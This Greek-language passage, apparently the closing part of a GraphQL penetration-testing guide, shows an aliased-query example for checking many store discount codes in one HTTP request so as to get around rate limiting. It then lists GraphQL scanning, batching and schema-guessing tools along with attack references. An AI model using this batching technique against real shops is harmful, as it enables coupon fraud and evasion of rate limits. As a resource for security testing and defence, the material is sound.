Λάβετε υπόψη το παρακάτω παράδειγμα, το οποίο επιδεικνύει πώς τα ερωτήματα με ψευδώνυμα μπορούν να χρησιμοποιηθούν για να επαληθεύσουν την εγκυρότητα των κωδικών έκπτωσης καταστήματος. Αυτή η μέθοδος θα μπορούσε να παρακάμψει τον περιορισμό του ρυθμού καθώς συγκεντρώνει αρκετά ερωτήματα σε ένα αίτημα HTTP, επιτρέποντας πιθανώς την επαλήθευση πολλών κωδικών έκπτωσης ταυτόχρονα.
```bash
# Example of a request utilizing aliased queries to check for valid discount codes
query isValidDiscount($code: Int) {
isvalidDiscount(code:$code){
valid
}
isValidDiscount2:isValidDiscount(code:$code){
valid
}
isValidDiscount3:isValidDiscount(code:$code){
valid
}
}
```
## Εργαλεία

### Σαρωτές ευπαθειών

* [https://github.com/dolevf/graphql-cop](https://github.com/dolevf/graphql-cop): Δοκιμάζει κοινές λανθάνουσες ρυθμίσεις των σημείων πρόσβασης του graphql
* [https://github.com/assetnote/batchql](https://github.com/assetnote/batchql): Σενάριο αξιολόγησης ασφάλειας GraphQL με έμφαση στην εκτέλεση πακέτων ερωτήσεων και μεταλλάξεων GraphQL.
* [https://github.com/dolevf/graphw00f](https://github.com/dolevf/graphw00f): Αναγνωρίζει το graphql που χρησιμοποιείται
* [https://github.com/gsmith257-cyber/GraphCrawler](https://github.com/gsmith257-cyber/GraphCrawler): Εργαλείο που μπορεί να χρησιμοποιηθεί για τη λήψη σχημάτων και την αναζήτηση ευαίσθητων δεδομένων, δοκιμή εξουσιοδότησης, δύναμη εξαναγκασμού σχημάτων και εύρεση διαδρομών προς έναν δεδομένο τύπο.
* [https://blog.doyensec.com/2020/03/26/graphql-scanner.html](https://blog.doyensec.com/2020/03/26/graphql-scanner.html): Μπορεί να χρησιμοποιηθεί ως αυτόνομο ή [επέκταση Burp](https://github.com/doyensec/inql).
* [https://github.com/swisskyrepo/GraphQLmap](https://github.com/swisskyrepo/GraphQLmap): Μπορεί να χρησιμοποιηθεί ως πελάτης CLI επίσης για την αυτοματοποίηση επιθέσεων
* [https://gitlab.com/dee-see/graphql-path-enum](https://gitlab.com/dee-see/graphql-path-enum): Εργαλείο που καταλογογραφεί τους διαφορετικούς τρόπους **επίτευξης ενός δεδομένου τύπου σε ένα σχήμα GraphQL**.
* [https://github.com/doyensec/GQLSpection](https://github.com/doyensec/GQLSpection): Ο Διάδοχος των Αυτόνομων και Λειτουργικών Καταστάσεων του InQL
* [https://github.com/doyensec/inql](https://github.com/doyensec/inql): Επέκταση Burp για προηγμένη δοκιμή GraphQL. Το _**Scanner**_ είναι το πυρήνας του InQL v5.0, όπου μπορείτε να αναλύσετε ένα σημείο πρόσβασης GraphQL ή ένα τοπικό αρχείο εισαγωγής σχήματος. Δημιουργεί αυτόματα όλες τις πιθανές ερωτήσεις και μεταλλάξεις, τις οργανώνει σε δομημένη προβολή για την ανάλυσή σας. Το στοιχείο _**Attacker**_ σάς επιτρέπει να εκτελέσετε επιθέσεις batch GraphQL, οι οποίες μπορεί να είναι χρήσιμες για την παράκαμψη κακά υλοποιημένων ορίων ρυθμού.
* [https://github.com/nikitastupin/clairvoyance](https://github.com/nikitastupin/clairvoyance): Δοκιμάστε να λάβετε το σχήμα ακόμα και με την εισαγωγή απενεργοποιημένη χρησιμοποιώντας τη βοήθεια ορισμένων βάσεων δεδομένων Graphql που θα προτείνουν τα ονόματα των μεταλλάξεων και των παραμέτρων.

### Πελάτες

* [https://github.com/graphql/graphiql](https://github.com/graphql/graphiql): Πελάτης GUI
* [https://altair.sirmuel.design/](https://altair.sirmuel.design/): Πελάτης GUI

### Αυτόματες Δοκιμές

{% embed url="https://graphql-dashboard.herokuapp.com/" %}

* Βίντεο που εξηγεί το AutoGraphQL: [https://www.youtube.com/watch?v=JJmufWfVvyU](https://www.youtube.com/watch?v=JJmufWfVvyU)

## Αναφορές

* [**https://jondow.eu/practical-graphql-attack-vectors/**](https://jondow.eu/practical-graphql-attack-vectors/)
* [**https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696**](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
* [**https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4**](https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4)
* [**http://ghostlulz.com/api-hacking-graphql/**](http://ghostlulz.com/api-hacking-graphql/)
* [**https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md**](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md)
* [**https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696**](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
* [**https://portswigger.net/web-security/graphql**](https://portswigger.net/web-security/graphql)
